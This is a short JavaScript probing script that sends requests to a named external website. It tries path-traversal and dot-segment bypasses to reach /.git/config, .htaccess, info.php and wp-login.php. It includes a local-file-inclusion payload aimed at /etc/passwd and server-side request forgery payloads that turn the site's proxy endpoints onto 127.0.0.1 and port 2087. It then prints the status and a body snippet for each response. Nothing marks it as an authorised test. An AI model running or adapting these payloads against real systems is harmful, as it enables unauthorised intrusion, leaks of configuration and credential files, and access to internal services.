import { makeClient } from './lib.mjs';
const c = makeClient('https://tutorialinjectid.my.id');
const t = [
 ['/.git/config','prefix-dot'],['/./.git/config','dot'],['/./info.php','dot'],
 ['/./config/index.php','dot'],['/.htaccess','base'],['/./.htaccess','dot'],
 ['/./config/index.php?page=../../../etc/passwd','dot-lfi'],
 ['/./ssh/fetch_helper.php?url=http://127.0.0.1/','dot-ssrf'],
 ['/./getcontact/api.php?action=init','dot'],
 ['/./drama/proxy.php?url=http://127.0.0.1:2087/','dot-ssrf2'],
 ['/./wp-login.php','dot'],['/././info.php','dot2'],
];
for (const [p,tag] of t) {
  try { const r=await c.get(p); const b=(r.body||'').replace(/\s+/g,' ');
    console.log(String(r.status).padEnd(4), String((r.body||'').length).padStart(6), tag.padEnd(10), p.padEnd(45), '||', b.slice(0,80)); }
  catch(e){ console.log('ERR ', tag, p, e.message); }
}
